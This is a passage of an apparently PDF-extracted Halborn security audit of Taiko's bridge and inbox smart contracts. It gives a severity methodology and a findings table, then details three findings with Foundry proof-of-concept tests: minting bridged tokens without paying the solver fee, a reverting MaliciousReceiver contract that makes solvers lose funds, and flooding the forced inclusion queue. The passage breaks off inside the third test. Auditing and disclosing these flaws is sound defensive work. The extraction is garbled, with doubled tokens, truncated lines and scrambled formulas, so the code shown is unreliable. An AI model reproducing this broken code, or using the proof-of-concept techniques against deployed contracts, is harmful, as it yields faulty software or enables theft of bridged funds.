### // Security Assessment 02.24.2025 - 03.07.2025

# Taiko Alethia


### Taiko

## Prepared by: HALBORN Last Updated 03/12/2025 Date of Engagement by: February 24th, 2025 - March 7th, 2025

### Summary


### 100 %

ALL FINDINGS
### 9



CRITICAL

### 1


### OF ALL REPORTED FINDINGS HAVE BEEN ADDRESSED



HIGH

### 1



MEDIUM

### 4



LOW

### 2



INFORMATIONAL

### 1


### TABLE OF CONTENTS

1. Introduction

2. Assessment summary

3. Test approach and methodology

4. Automated

5. Risk methodology

6. Scope

7. Assessment summary & findings overview

8. Findings & Tech Details


8.1 Missing token transfer for solver fee in bridged token path

8.2 Solvers lose funds on eth transfer rejection

8.3 Low-cost dos attack on forced inclusion queue

8.4 Insufficient validation in taikowrapper allows transaction censorship in forced inclusions

8.5 Missing payable modifier in proposebatch function

8.6 Erc20 tokens become unrecoverable in bridge retry mechanism for special addresses

8.7 inability to submit identical proofs leads to unnecessary rejections

8.8 Reset of transition creation timestamp on conflicting proofs

8.9 Unused _consumetokenquota function in erc20vault contract


### 1. Introduction

`Taiko` engaged Halborn to conduct a security assessment on their smart contracts beginning on

February 24th, 2025 and ending on March 7th, 2025.


The security assessment was scoped to the smart contracts provided to the Halborn team.

### 2. Assessment Summary


The team at Halborn was provided 2 weeks for the engagement and assigned a security engineer to

evaluate the security of the smart contract.


The security engineer is a blockchain and smart-contract security expert with advanced penetration

testing, smart-contract hacking, and deep knowledge of multiple blockchain protocols.


The purpose of this assessment is to:


Ensure that smart contract functions operate as intended.

Identify potential security issues with the smart contracts.


In summary, Halborn identified some improvements to reduce the likelihood and impact of risks, which
were completely addressed by the `Taiko team` . The main ones were the following:

```
   Ensure op_.solverFee is always fetched.
   Implement a better mechanism to protect solvers.
   Add input verification for forced verifications.
   Implement forced inclusions of TXs for proposers.

```

### 3. Test Approach And Methodology

Halborn performed a combination of manual and automated security testing to balance efficiency,

timeliness, practicality, and accuracy regarding the scope of this assessment. While manual testing

is recommended to uncover flaws in logic, process, and implementation; automated testing

techniques help enhance code coverage and quickly identify items that do not follow the security

best practices. The following phases and associated tools were used during the assessment:


Research into architecture and purpose.

Smart contract manual code review and walkthrough.
Graphing out functionality and contract logic/connectivity/functions. ( `solgraph,draw.io` )

Manual assessment of use and safety for the critical Solidity variables and functions in scope to

identify any arithmetic related vulnerability classes.


Manual testing by custom scripts.
Static Analysis of security for scoped contract, and imported functions. ( `Slither` )
Testnet deployment. ( `Hardhat`, `Foundry` )


### 4. Automated

Halborn used automated testing techniques to enhance the coverage of certain areas of the smart
contracts in scope. Among the tools used was `Slither`, a Solidity static analysis framework.


After Halborn verified the smart contracts in the repository and was able to compile them correctly

into their abis and binary format, Slither was run against the contracts. This tool can statically verify

mathematical relationships between Solidity variables to detect invalid or inconsistent usage of the

contracts' APIs across the entire code-base.


All issues identified by `Slither` were proved to be false positives or have been added to the issue list

in this report.


### 5. RISK METHODOLOGY

Every vulnerability and issue observed by Halborn is ranked based on **two sets** of **Metrics** and a

**Severity Coefficient** . This system is inspired by the industry standard Common Vulnerability Scoring

System.


The two **Metric sets** are: **Exploitability** and **Impact** . **Exploitability** captures the ease and technical

means by which vulnerabilities can be exploited and **Impact** describes the consequences of a

successful exploit.


The **Severity Coefficients** is designed to further refine the accuracy of the ranking with two factors:

**Reversibility** and **Scope** . These capture the impact of the vulnerability on the environment as well as

the number of users and smart contracts affected.


The final score is a value between 0-10 rounded up to 1 decimal place and 10 corresponding to the

highest security risk. This provides an objective and accurate rating of the severity of security

vulnerabilities in smart contracts.


The system is designed to assist in identifying and prioritizing vulnerabilities based on their level of

risk to address the most critical issues in a timely manner.

### 5.1 EXPLOITABILITY


ATTACK ORIGIN (AO) :


Captures whether the attack requires compromising a specific account.


ATTACK COST (AC) :


Captures the cost of exploiting the vulnerability incurred by the attacker relative to sending a single

transaction on the relevant blockchain. Includes but is not limited to financial and computational

cost.


ATTACK COMPLEXITY (AX) :


Describes the conditions beyond the attacker’s control that must exist in order to exploit the

vulnerability. Includes but is not limited to macro situation, available third-party liquidity and

regulatory challenges.


METRICS :


**EXPLOITABILITY METRIC (** _ME_ ​ **)** **METRIC VALUE** **NUMERICAL VALUE**



Arbitrary (AO:A)
Attack Origin (AO)

Specific (AO:S)



1
0.2


1
0.67
0.33


1
0.67
0.33



Attack Cost (AC)


Attack Complexity (AX)



Low (AC:L)
Medium (AC:M)

High (AC:H)


Low (AX:L)
Medium (AX:M)

High (AX:H)


## Exploitability E is calculated using the following formula:

​
## E = me ∏

### 5.2 IMPACT


CONFIDENTIALITY (C) :


Measures the impact to the confidentiality of the information resources managed by the contract due

to a successfully exploited vulnerability. Confidentiality refers to limiting access to authorized users

only.


INTEGRITY (I) :


Measures the impact to integrity of a successfully exploited vulnerability. Integrity refers to the

trustworthiness and veracity of data stored and/or processed on-chain. Integrity impact directly

affecting Deposit or Yield records is excluded.


AVAILABILITY (A) :


Measures the impact to the availability of the impacted component resulting from a successfully

exploited vulnerability. This metric refers to smart contract features and functionality, not state.

Availability impact directly affecting Deposit or Yield is excluded.


DEPOSIT (D) :


Measures the impact to the deposits made to the contract by either users or owners.


YIELD (Y) :


Measures the impact to the yield generated by the contract for either users or owners.


METRICS :


**IMPACT METRIC (** _MI_ **)** ​ **METRIC VALUE** **NUMERICAL VALUE**



0
0.25
0.5
0.75
1


0
0.25
0.5
0.75
1


0
0.25
0.5
0.75
1


0
0.25
0.5
0.75
1


0
0.25
0.5
0.75
1



Confidentiality (C)


Integrity (I)


Availability (A)


Deposit (D)


Yield (Y)



None (I:N)

Low (I:L)
Medium (I:M)

High (I:H)
Critical (I:C)


None (I:N)

Low (I:L)
Medium (I:M)

High (I:H)
Critical (I:C)


None (A:N)

Low (A:L)
Medium (A:M)

High (A:H)
Critical (A:C)


None (D:N)

Low (D:L)
Medium (D:M)

High (D:H)
Critical (D:C)


None (Y:N)

Low (Y:L)
Medium (Y:M)

High (Y:H)
Critical (Y:C)


## Impact I is calculated using the following formula:


## I = max ( mI ​) +

### 5.3 SEVERITY COEFFICIENT

REVERSIBILITY (R) :


## ∑ mI ​ − max ( mI ​) 4 ​



Describes the share of the exploited vulnerability effects that can be reversed. For upgradeable

contracts, assume the contract private key is available.


SCOPE (S) :


Captures whether a vulnerability in one vulnerable contract impacts resources in other contracts.


METRICS :


**SEVERITY COEFFICIENT (** _C_ **)** **COEFFICIENT VALUE** **NUMERICAL VALUE**



Reversibility ( _r_ )



None (R:N)
Partial (R:P)

Full (R:F)



Changed (S:C)
Scope ( _s_ )
Unchanged (S:U)

## Severity Coefficient C is obtained by the following product: C = rs The Vulnerability Severity Score S is obtained by: S = min (10, EIC ∗10)


The score is rounded up to 1 decimal places.


**SEVERITY** **SCORE VALUE RANGE**


Critical 9 - 10


High 7 - 8.9


Medium 4.5 - 6.9


Low 2 - 4.4



1
0.5
0.25


1.25
1


**SEVERITY** **SCORE VALUE RANGE**


Informational 0 - 1.9


### 6. SCOPE

FILES AND REPOSITORY


[(a) Repository: taiko-mono](https://github.com/taikoxyz/taiko-mono)


(b) Assessed Commit ID: a1e4ed7


(c) Items in scope:


ERC20Vault.sol

TaikoWrapper.sol

ForcedInclusionStore.sol

TaikoInbox.sol


Out-of-Scope: Third party dependencies and economic attacks. All code modifications not

directly related to the issues included in this report. (e.g., new features)


REMEDIATION COMMIT ID:


[https://github.com/taikoxyz/taiko-](https://github.com/taikoxyz/taiko-mono/pull/19048/commits/a8910ce9c5b56a59b4ce32a76286e66e739fa7b9)

[mono/pull/19048/commits/a8910ce9c5b56a59b4ce32a76286e66e739fa7b9](https://github.com/taikoxyz/taiko-mono/pull/19048/commits/a8910ce9c5b56a59b4ce32a76286e66e739fa7b9)


[c9edab8](https://github.com/taikoxyz/taiko-mono/commit/c9edab82888f6577f1c42c336a23a7f432946da1)

[https://github.com/taikoxyz/taiko-](https://github.com/taikoxyz/taiko-mono/pull/19070/commits/07ccdc76994c0cd4218f942d6ce5df3b553d533e)

[mono/pull/19070/commits/07ccdc76994c0cd4218f942d6ce5df3b553d533e](https://github.com/taikoxyz/taiko-mono/pull/19070/commits/07ccdc76994c0cd4218f942d6ce5df3b553d533e)


[https://github.com/taikoxyz/taiko-](https://github.com/taikoxyz/taiko-mono/pull/19013/commits/3e9cd7333311b7eeaf726d8805480ae3df22cdc2)

[mono/pull/19013/commits/3e9cd7333311b7eeaf726d8805480ae3df22cdc2](https://github.com/taikoxyz/taiko-mono/pull/19013/commits/3e9cd7333311b7eeaf726d8805480ae3df22cdc2)


[a7cf79e](https://github.com/taikoxyz/taiko-mono/commit/a7cf79e127e9a8f1b792db5f77731d7ef744ea6b)

[https://github.com/taikoxyz/taiko-](https://github.com/taikoxyz/taiko-mono/pull/19040/commits/33d1bb7bb1e3c830b46a042c7152e2d6c4c07439)

[mono/pull/19040/commits/33d1bb7bb1e3c830b46a042c7152e2d6c4c07439](https://github.com/taikoxyz/taiko-mono/pull/19040/commits/33d1bb7bb1e3c830b46a042c7152e2d6c4c07439)


[https://github.com/taikoxyz/taiko-](https://github.com/taikoxyz/taiko-mono/pull/19056/commits/7c946115166dd850fd6492fda7473f83574cb659)

[mono/pull/19056/commits/7c946115166dd850fd6492fda7473f83574cb659](https://github.com/taikoxyz/taiko-mono/pull/19056/commits/7c946115166dd850fd6492fda7473f83574cb659)


[https://github.com/taikoxyz/taiko-](https://github.com/taikoxyz/taiko-mono/pull/19017/commits/e913a2cc3a4b6c4dc1dc1ca65ae5a2505558c85d)

[mono/pull/19017/commits/e913a2cc3a4b6c4dc1dc1ca65ae5a2505558c85d](https://github.com/taikoxyz/taiko-mono/pull/19017/commits/e913a2cc3a4b6c4dc1dc1ca65ae5a2505558c85d)


[https://github.com/taikoxyz/taiko-](https://github.com/taikoxyz/taiko-mono/pull/19064/commits/a3f172173e2a662670865a7a18172e74c69d7956)

[mono/pull/19064/commits/a3f172173e2a662670865a7a18172e74c69d7956](https://github.com/taikoxyz/taiko-mono/pull/19064/commits/a3f172173e2a662670865a7a18172e74c69d7956)


Out-of-Scope: New features/implementations after the remediation commit IDs.


### 7. ASSESSMENT SUMMARY & FINDINGS OVERVIEW



CRITICAL

### 1



HIGH

### 1



MEDIUM

### 4



LOW

### 2



INFORMATIONAL

### 1


**SECURITY ANALYSIS** **RISK LEVEL** **REMEDIATION DATE**


MISSING TOKEN TRANSFER FOR SOLVER FEE IN

CRITICAL SOLVED - 03/07/2025
BRIDGED TOKEN PATH


SOLVERS LOSE FUNDS ON ETH TRANSFER REJECTION HIGH SOLVED - 03/04/2025


LOW-COST DOS ATTACK ON FORCED INCLUSION

MEDIUM SOLVED - 03/11/2025
QUEUE



INSUFFICIENT VALIDATION IN TAIKOWRAPPER
ALLOWS TRANSACTION CENSORSHIP IN FORCED

INCLUSIONS



MEDIUM SOLVED - 03/01/2025



MISSING PAYABLE MODIFIER IN PROPOSEBATCH

MEDIUM SOLVED - 03/05/2025
FUNCTION


ERC20 TOKENS BECOME UNRECOVERABLE IN BRIDGE

MEDIUM SOLVED - 03/05/2025
RETRY MECHANISM FOR SPECIAL ADDRESSES


INABILITY TO SUBMIT IDENTICAL PROOFS LEADS TO

LOW SOLVED - 03/11/2025
UNNECESSARY REJECTIONS


**SECURITY ANALYSIS** **RISK LEVEL** **REMEDIATION DATE**


RESET OF TRANSITION CREATION TIMESTAMP ON

LOW SOLVED - 03/04/2025
CONFLICTING PROOFS


UNUSED _CONSUMETOKENQUOTA FUNCTION IN

INFORMATIONAL SOLVED - 03/10/2025
ERC20VAULT CONTRACT


### 8. FINDINGS & TECH DETAILS 8.1 MISSING TOKEN TRANSFER FOR SOLVER FEE IN BRIDGED TOKEN PATH // CRITICAL Description

In the `handleMessage()` function, there's an inconsistency in how `op.solverFee` is handled across

different token types:


For Native ETH (first case) : the function checks at the beginning that `msg.value` covers both
```
op.amount + op.solverFee

```

uint256uint256 etherToBridge etherToBridge = (_op_op.token token ==== addressaddress(0) ? _op _op.amount amount + _op _op.solvesolve

ifif (msgmsg.value value < _op _op.fee fee + etherToBridge etherToBridge) { revertrevert VAULT_INSUFFICIENT_ETHEVAULT_INSUFFICIENT_ETHE


ifif (_op_op.token token ==== addressaddress(0)) {
balanceChangeAmount_   balanceChangeAmount_ = _op _op.amountamount;
balanceChangeSolverFee_   balanceChangeSolverFee_ = _op _op.solverFeesolverFee;
}


For Bridged Tokens (second case): MISSING _op.solverFee transferFrom


elseelse ifif (bridgedToCanonicalbridgedToCanonical[_op_op.tokentoken].addr addr !=!= addressaddress(0)) {
// Handle bridged token// Handle bridged token

ctoken_   ctoken_ = bridgedToCanonical bridgedToCanonical[_op_op.tokentoken];
IERC20IERC20(_op_op.tokentoken).safeTransferFromsafeTransferFrom(msgmsg.sendersender, addressaddress(thisthis), _op _op.amoamo

IBridgedERC20IBridgedERC20(_op_op.tokentoken).burnburn(_op_op.amountamount);
balanceChangeAmount_   balanceChangeAmount_ = _op _op.amountamount;
balanceChangeSolverFee_   balanceChangeSolverFee_ = _op _op.solverFeesolverFee;
}


For Canonical Tokens (third case):


elseelse {
// Handle canonical token// Handle canonical token


// ...// ...

balanceChangeAmount_   balanceChangeAmount_ = _transferTokenAndReturnBalanceDiff_transferTokenAndReturnBalanceDiff(_op_op.tokentoken,
balanceChangeSolverFee_   balanceChangeSolverFee_ = _transferTokenAndReturnBalanceDiff_transferTokenAndReturnBalanceDiff(_op_op.toketoke

}


When bridging tokens with a non-zero `solverFee`, only the `amount` is transferred and burned on the
source chain, but the bridging message still includes `balanceChangeSolverFee_` set to

`_op.solverFee` .


This creates a **token inflation vulnerability** that can be exploited to:


Mint arbitrary tokens on the destination chain

Break the 1:1 peg between bridged assets

Drain liquidity from the destination chain

### Proof of Concept


This test can be added to ERC20Vault.t.sol (with mocked mint functionalities at the beginning):


//E forge test --match-test "test_20Vault_bridgedToken_solverFee_not_tran//E forge test --match-test "test_20Vault_bridgedToken_solverFee_not_tran

functionfunction test_20Vault_bridgedToken_solverFee_not_transferredtest_20Vault_bridgedToken_solverFee_not_transferred() publicpublic

vm    vm.startPrankstartPrank(AliceAlice);
vm    vm.chainIdchainId(ethereumChainIdethereumChainId);


// First, we need to create a bridged token scenario// First, we need to create a bridged token scenario

// Deploy a token on one chain that will be bridged// Deploy a token on one chain that will be bridged

FreeMintERC20Token originalToken     FreeMintERC20Token originalToken = newnew FreeMintERC20TokenFreeMintERC20Token("Origin"Origin

originalToken    originalToken.mintmint(AliceAlice);


// Create a canonical representation for this token// Create a canonical representation for this token

ERC20Vault    ERC20Vault.CanonicalERC20 CanonicalERC20 memorymemory canonicalToken canonicalToken = ERC20Vault ERC20Vault.CanoCano

chainId      chainId: 999999, // Some other chain ID// Some other chain ID

addr      addr: addressaddress(originalTokenoriginalToken),
decimals      decimals: 1818,
symbol      symbol: "ORIG""ORIG",
name      name: "Original""Original"

});


// Deploy a bridged token on this chain// Deploy a bridged token on this chain

addressaddress bridgedTokenAddr bridgedTokenAddr = addressaddress(newnew BridgedERC20BridgedERC20(addressaddress(eVauleVaul


// Set up the mappings in the vault// Set up the mappings in the vault


vm    vm.stopPrankstopPrank();
vm    vm.startPrankstartPrank(deployerdeployer);


// Warp time to avoid VAULT_LAST_MIGRATION_TOO_CLOSE error// Warp time to avoid VAULT_LAST_MIGRATION_TOO_CLOSE error

// The contract requires at least 90 days between migrations// The contract requires at least 90 days between migrations

vm    vm.warpwarp(blockblock.timestamp timestamp + 9191 days days);


console    console.loglog("test0""test0");
eVault    eVault.changeBridgedTokenchangeBridgedToken(canonicalTokencanonicalToken, bridgedTokenAddr bridgedTokenAddr);
vm    vm.stopPrankstopPrank();


vm    vm.startPrankstartPrank(AliceAlice);


// Mint some bridged tokens to Alice// Mint some bridged tokens to Alice

vm    vm.stopPrankstopPrank();
vm    vm.prankprank(deployerdeployer); // Only owner or erc20Vault can mint// Only owner or erc20Vault can mint

BridgedERC20BridgedERC20(bridgedTokenAddrbridgedTokenAddr).mintmint(AliceAlice, 10e1810e18);
vm    vm.startPrankstartPrank(AliceAlice);
uint256uint256 aliceBalanceBefore aliceBalanceBefore = BridgedERC20BridgedERC20(bridgedTokenAddrbridgedTokenAddr).balanbalan

console    console.loglog("Alice amount before = %s""Alice amount before = %s", aliceBalanceBefore aliceBalanceBefore);


// Now let's try to bridge the token with a solver fee// Now let's try to bridge the token with a solver fee

uint256uint256 amount amount = 1e181e18;
uint256uint256 solverFee solverFee = 2e182e18;


// Approve only the amount, not the solver fee// Approve only the amount, not the solver fee

// This should work if the contract doesn't try to transfer the s// This should work if the contract doesn't try to transfer the s

BridgedERC20BridgedERC20(bridgedTokenAddrbridgedTokenAddr).approveapprove(addressaddress(eVaulteVault), amount amount);
// This should NOT revert, which proves that the contract is not // This should NOT revert, which proves that the contract is not

// to transfer the solver fee tokens from the user// to transfer the solver fee tokens from the user

eVault    eVault.sendTokensendToken(
ERC20Vault      ERC20Vault.BridgeTransferOpBridgeTransferOp(
taikoChainId        taikoChainId,
addressaddress(0),
Bob        Bob,
0, // No processing fee// No processing fee

bridgedTokenAddr        bridgedTokenAddr,
1_000_000_000_000,
uint256uint256(amountamount),
uint256uint256(solverFeesolverFee)
)
);


// Check that only the amount was deducted from Alice's balance// Check that only the amount was deducted from Alice's balance


// If the solver fee was correctly handled, this should fail beca// If the solver fee was correctly handled, this should fail beca

// Alice would need to approve amount + solverFee// Alice would need to approve amount + solverFee

uint256uint256 aliceBalanceAfter aliceBalanceAfter = BridgedERC20BridgedERC20(bridgedTokenAddrbridgedTokenAddr).balancbalanc

console    console.loglog("Alice amount after = %s""Alice amount after = %s", aliceBalanceAfter aliceBalanceAfter);
console    console.loglog("Alice amount before - Alice amount after = %s""Alice amount before - Alice amount after = %s", alic alic

console    console.loglog("amount + solverFee = %s""amount + solverFee = %s", amount amount + solverFee solverFee);
assertEqassertEq(aliceBalanceBefore aliceBalanceBefore - aliceBalanceAfter aliceBalanceAfter, amount amount);
}


Here the result demonstrating that Alice only approve 1e18 but solverFee is set to 2e18 which allows

Alice to solve herself the TX on the bridge chain and get 3 times more tokens than intended :

### BVSS AO:A/AC:L/AX:L/R:N/S:U/C:N/A:N/I:N/D:C/Y:C (10.0) Recommendation


The bridged token case should be modified to handle _op.solverFee properly:


elseelse ifif (bridgedToCanonicalbridgedToCanonical[_op_op.tokentoken].addr addr !=!= addressaddress(0)) {
// Handle bridged token// Handle bridged token

ctoken_   ctoken_ = bridgedToCanonical bridgedToCanonical[_op_op.tokentoken];


// Transfer and burn both amount and solverFee// Transfer and burn both amount and solverFee

uint256uint256 totalAmount totalAmount = _op _op.amount amount + _op _op.solverFeesolverFee;
IERC20IERC20(_op_op.tokentoken).safeTransferFromsafeTransferFrom(msgmsg.sendersender, addressaddress(thisthis), totalAm totalAm

IBridgedERC20IBridgedERC20(_op_op.tokentoken).burnburn(totalAmounttotalAmount);


balanceChangeAmount_   balanceChangeAmount_ = _op _op.amountamount;
balanceChangeSolverFee_   balanceChangeSolverFee_ = _op _op.solverFeesolverFee;
}


### Remediation Comment

SOLVED : The **Taiko team** solved the issue by adding `_op.solverFee` to the amount transferred from

the user and burning it after.

### Remediation Hash


<u>[https://github.com/taikoxyz/taiko-mono/pull/19048/commits/a8910ce9c5b56a59b4ce32a76286e66](https://github.com/taikoxyz/taiko-mono/pull/19048/commits/a8910ce9c5b56a59b4ce32a76286e66e739fa7b9)</u>

<u>[e739fa7b9](https://github.com/taikoxyz/taiko-mono/pull/19048/commits/a8910ce9c5b56a59b4ce32a76286e66e739fa7b9)</u>


### 8.2 SOLVERS LOSE FUNDS ON ETH TRANSFER REJECTION // HIGH Description

The `ERC20Vault` contract has a vulnerability in the `onMessageInvocation` function where remaining
Ether is sent to the original recipient address ( `to` ) rather than to the solver ( `tokenRecipient` ) who

has already provided tokens for the bridging transaction.


uint256uint256 amountToTransfer amountToTransfer = amount amount + solverFee solverFee;
token token = _transferTokensOrEther_transferTokensOrEther(ctokenctoken, tokenRecipient tokenRecipient, amountToTransfer amountToTransfer);


toto.sendEtherAndVerifysendEtherAndVerify(
ctoken   ctoken.addr addr ==== addressaddress(0) ? msg msg.value value - amountToTransfer amountToTransfer : msg msg.valuevalue

);


This creates a severe issue when the bridging request's recipient is a contract that intentionally

reverts on Ether transfers. In this scenario:

1. A solver solves a bridging request by transferring ERC20 tokens to the recipient
2. The ERC20Vault correctly identifies the solver and records it in `solverConditionToSolver`

3. The tokens are redirected to the solver as expected
4. When the function attempts to send remaining Ether to `to` instead of `tokenRecipient`
5. The entire transaction reverts if `to` rejects the Ether transfer

6. The solver has already spent tokens to solve the transaction but receives nothing in return


Key impacts:


Direct financial loss for solvers

Reduced solver participation due to risk

### Proof of Concept


This test can be added to ERC20Vault.t.sol:


//E forge test --match-test "test_20Vault_solver_vulnerability" -vv//E forge test --match-test "test_20Vault_solver_vulnerability" -vv

functionfunction test_20Vault_solver_vulnerabilitytest_20Vault_solver_vulnerability() publicpublic {
vm    vm.chainIdchainId(taikoChainIdtaikoChainId);


// Deploy the malicious contract// Deploy the malicious contract

MaliciousReceiver maliciousReceiver     MaliciousReceiver maliciousReceiver = newnew MaliciousReceiverMaliciousReceiver();


// Mint some tokens to the vault// Mint some tokens to the vault

eERC20Token1    eERC20Token1.mintmint(addressaddress(eVaulteVault));


uint64uint64 amount amount = 1;
uint64uint64 solverFee solverFee = 2;
addressaddress to to = addressaddress(maliciousReceivermaliciousReceiver); // Use the malicious con// Use the malicious con

addressaddress solver solver = David David; // The solver// The solver

bytes32bytes32 solverCondition solverCondition = eVault eVault.getSolverConditiongetSolverCondition(1, addressaddress(eEeE


// Mint tokens to the solver so they can solve the bridging reque// Mint tokens to the solver so they can solve the bridging reque

eERC20Token1    eERC20Token1.mintmint(solversolver);


vm    vm.startPrankstartPrank(solversolver);


// Set up L2 batch for solve verification// Set up L2 batch for solve verification

uint64uint64 blockId blockId = 1;
bytes32bytes32 blockMetaHash blockMetaHash = bytes32bytes32("metahash""metahash");
ITaikoInbox    ITaikoInbox.Batch Batch memorymemory batch batch;
batch    batch.metaHash metaHash = blockMetaHash blockMetaHash;
taikoInbox    taikoInbox.setBatchsetBatch(batchbatch);


// Solver approves tokens and solves the transaction// Solver approves tokens and solves the transaction

eERC20Token1    eERC20Token1.approveapprove(addressaddress(eVaulteVault), amount amount);
eVault    eVault.solvesolve(
ERC20Vault      ERC20Vault.SolverOpSolverOp(1, addressaddress(eERC20Token1eERC20Token1), to to, amount amount, blo blo

);


vm    vm.stopPrankstopPrank();


// Verify the solver is registered as the solver for this conditi// Verify the solver is registered as the solver for this conditi

assertEqassertEq(eVaulteVault.solverConditionToSolversolverConditionToSolver(solverConditionsolverCondition), solver solver)


// Now, instead of calling through the mock bridge, we'll directl// Now, instead of calling through the mock bridge, we'll directl

// This better simulates what happens in the real contract// This better simulates what happens in the real contract


// Prepare the data for onMessageInvocation// Prepare the data for onMessageInvocation

ERC20Vault    ERC20Vault.CanonicalERC20 CanonicalERC20 memorymemory ctoken ctoken = erc20ToCanonicalERC20erc20ToCanonicalERC20(t
addressaddress fromfrom = Alice Alice;
uint256uint256 etherAmount etherAmount = 0.10.1 ether ether; // Include some Ether to trigger// Include some Ether to trigger


bytesbytes memorymemory messageData messageData = abi abi.encodeencode(
ctoken      ctoken,
fromfrom,


to      to, // The malicious contract that will revert on Ether trans// The malicious contract that will revert on Ether trans

amount      amount,
solverFee      solverFee,
solverCondition      solverCondition

);


// We'll need to mock the bridge context// We'll need to mock the bridge context

vm    vm.prankprank(addressaddress(tBridgetBridge));


// This should revert because the malicious contract refuses Ethe// This should revert because the malicious contract refuses Ethe

vm    vm.expectRevertexpectRevert(LibAddressLibAddress.ETH_TRANSFER_FAILEDETH_TRANSFER_FAILED.selectorselector);
eVault    eVault.onMessageInvocationonMessageInvocation{valuevalue: etherAmount etherAmount}(messageDatamessageData);


// The vulnerability is that when the transaction reverts:// The vulnerability is that when the transaction reverts:

// 1. The solver has already transferred tokens to solve the requ// 1. The solver has already transferred tokens to solve the requ

// 2. The solver is registered as the solver for this condition// 2. The solver is registered as the solver for this condition

// 3. But the transaction reverts when sending Ether to 'to' (not// 3. But the transaction reverts when sending Ether to 'to' (not

// 4. So the solver loses their tokens, but the user transaction // 4. So the solver loses their tokens, but the user transaction


// The fix would be to change `to.sendEtherAndVerify` to `tokenRe// The fix would be to change `to.sendEtherAndVerify` to `tokenRe

// in the onMessageInvocation function// in the onMessageInvocation function

}


// Create a malicious contract that will receive tokens but revert on// Create a malicious contract that will receive tokens but revert on

contractcontract MaliciousReceiverMaliciousReceiver {
// Will revert when receiving Ether// Will revert when receiving Ether

receivereceive() externalexternal payablepayable {
revertrevert("I refuse to accept Ether!""I refuse to accept Ether!");
}


// Optional fallback to ensure we always revert on ETH transfers// Optional fallback to ensure we always revert on ETH transfers

fallbackfallback() externalexternal payablepayable {
revertrevert("I refuse to accept Ether!""I refuse to accept Ether!");
}
}


In the result we can see solver has lost fund he deposited for solving the TX :


### BVSS AO:A/AC:L/AX:L/R:N/S:U/C:N/A:N/I:N/D:H/Y:N (7.5) Recommendation

It is recommended to modify the onMessageInvocation function to send the remaining Ether to

tokenRecipient instead of to. This ensures that even if the recipient address rejects Ether transfers,

the solver who has provided tokens will still receive the Ether portion of the transaction.

### Remediation Comment


SOLVED: The **Taiko team** implemented a fix to not check if the remaining ether sent is a successful

transaction, removing the risk for the solver to have nothing.

### Remediation Hash


<u>[https://github.com/taikoxyz/taiko-mono/commit/c9edab82888f6577f1c42c336a23a7f432946da1](https://github.com/taikoxyz/taiko-mono/commit/c9edab82888f6577f1c42c336a23a7f432946da1)</u>


### 8.3 LOW-COST DOS ATTACK ON FORCED INCLUSION QUEUE // MEDIUM Description

The `ForcedInclusionStore` contract allows malicious actors to flood the forced inclusion queue with

empty or useless requests at minimal cost. According to the Taiko team, this happens if

`blobByteOffset` or `blobByteSize` result in an empty byte array instead of being treated as an error.

While this approach mitigates the full DoS problem, it still does not prevent legitimate users from

experiencing delays in transaction inclusion.


functionfunction storeForcedInclusionstoreForcedInclusion( uint8uint8 blobIndex blobIndex,uint32uint32 blobByteOffset blobByteOffset,uintuint

{
bytes32bytes32 blobHash blobHash = _blobHash_blobHash(blobIndexblobIndex);
requirerequire(blobHash blobHash !=!= bytes32bytes32(0), BlobNotFoundBlobNotFound());
requirerequire(msgmsg.value value ==== feeInGwei feeInGwei * 1 gwei gwei, IncorrectFeeIncorrectFee());


ForcedInclusion     ForcedInclusion memorymemory inclusion inclusion = ForcedInclusionForcedInclusion({
blobHash      blobHash: blobHash blobHash,
feeInGwei      feeInGwei: uint64uint64(msgmsg.value value / 1 gwei gwei),
createdAtBatchId      createdAtBatchId: _nextBatchId_nextBatchId(),
blobByteOffset      blobByteOffset: blobByteOffset blobByteOffset,
blobByteSize      blobByteSize: blobByteSize blobByteSize,
blobCreatedIn      blobCreatedIn: uint64uint64(blockblock.numbernumber)
});


queue    queue[tailtail++++] = inclusion inclusion;


emitemit ForcedInclusionStoredForcedInclusionStored(inclusioninclusion);
}


The issue exists because:
1. The contract accepts any values for `blobByteOffset` and `blobByteSize` without validation.

2. The fee is low compared to the impact.

3. The queue follows a strict FIFO order, forcing all requests (including invalid ones) to be processed

sequentially.


An attacker can submit numerous forced inclusion requests with deliberately invalid parameters (e.g.,

out-of-bounds offsets) that will result in empty transactions. With just 0.1 ETH, an attacker can

create 100 such requests, effectively blocking legitimate forced inclusions.


While these invalid requests won't crash the system (they'll be processed as empty transactions),

they:

1. Occupy all slots in the forced inclusion queue

2. Delay legitimate transactions from being included

3. Waste computational resources processing empty data


This attack renders the forced inclusion feature ineffective at a very low cost, as legitimate users

cannot rely on the system to include their transactions within a reasonable time frame.

### Proof of Concept


This test has been created (with some parts mocked):


//E forge test --match-test "test_forcedInclusion_flooding_attack" -vv//E forge test --match-test "test_forcedInclusion_flooding_attack" -vv

functionfunction test_forcedInclusion_flooding_attacktest_forcedInclusion_flooding_attack() publicpublic transactBytransactBy(AliAli

// Fund Alice with enough ETH// Fund Alice with enough ETH

vm    vm.dealdeal(AliceAlice, 1 ether ether);


uint64uint64 _feeInGwei _feeInGwei = store store.feeInGweifeeInGwei();
uint256uint256 feeInWei feeInWei = _feeInGwei _feeInGwei * 1 gwei gwei;
uint256uint256 ethPrice ethPrice = 21002100; // ETH price in USD// ETH price in USD

uint256uint256 numRequests numRequests = 200200;


// Calculate the total cost in various units// Calculate the total cost in various units

uint256uint256 totalCostWei totalCostWei = feeInWei feeInWei * numRequests numRequests;


// Convert to ETH and USD, avoiding overflow by using proper divi// Convert to ETH and USD, avoiding overflow by using proper divi

// Note: 1 ETH = 10^18 wei// Note: 1 ETH = 10^18 wei

uint256uint256 totalCostEthInteger totalCostEthInteger = totalCostWei totalCostWei / 1e181e18;
uint256uint256 totalCostEthDecimal totalCostEthDecimal = (totalCostWei totalCostWei * 10001000 / 1e181e18) % 10001000


// Calculate USD cost (handle with care to avoid overflow)// Calculate USD cost (handle with care to avoid overflow)

uint256uint256 totalCostUsd totalCostUsd = totalCostWei totalCostWei * ethPrice ethPrice / 1e181e18;


console    console.loglog("--- Forced Inclusion Flooding Attack Economics ---""--- Forced Inclusion Flooding Attack Economics ---")
console    console.loglog("Current ETH price: $%s""Current ETH price: $%s", ethPrice ethPrice);
console    console.loglog("Fee per inclusion: %s gwei (%s wei)""Fee per inclusion: %s gwei (%s wei)", _feeInGwei _feeInGwei, fe fe

console    console.loglog("Number of malicious requests: %s""Number of malicious requests: %s", numRequests numRequests);
console    console.loglog("Total cost (wei): %s""Total cost (wei): %s", totalCostWei totalCostWei);
console    console.loglog("Total cost (ETH): %s.%s""Total cost (ETH): %s.%s", totalCostEthInteger totalCostEthInteger, total total

